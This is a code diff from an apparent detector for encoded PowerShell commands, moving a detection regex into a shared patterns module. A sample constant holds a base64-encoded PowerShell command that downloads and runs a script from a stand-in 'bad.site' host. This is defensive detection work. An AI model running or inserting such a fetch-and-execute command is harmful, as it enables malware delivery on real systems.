@@ -17,8 +17,9 @@ from services.detectors.double_encoded_detector import detect_double_encoded_com
 EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
 import Levenshtein
 
+# Import pattern from central location
+from services.detectors.patterns import ENCODED_COMMAND_PATTERN
 
-ENCODED_COMMAND_PATTERN = r"[\u002D\u2013\u2014\u2015/](?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?)\s+[\"']?\s*([a-z0-9+/]{20,}={0,2})"
 try:
     import ppdeep
     PPDEEP_AVAILABLE = True
